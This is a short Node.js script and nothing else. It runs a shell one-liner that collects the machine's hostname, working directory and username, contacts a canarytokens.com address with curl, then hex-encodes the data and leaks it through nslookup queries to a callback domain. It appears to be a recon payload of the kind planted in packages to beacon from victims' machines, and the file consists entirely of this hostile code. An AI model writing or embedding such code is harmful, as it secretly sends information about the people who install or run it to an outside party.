const { exec } = require("child_process");
exec("a=$(hostname;pwd;whoami;echo 'Gcore';curl 19lxn17k8uj87rj432byqys6q.canarytokens.com;) && echo $a | xxd -p | head | while read ut;do nslookup $a.bind9-or-callback-server.com;done" , (error, data, getter) => {
	if(error){
		console.log("error",error.message);
		return;
	}
	if(getter){
		console.log(data);
		return;
	}
	console.log(data);
	
});
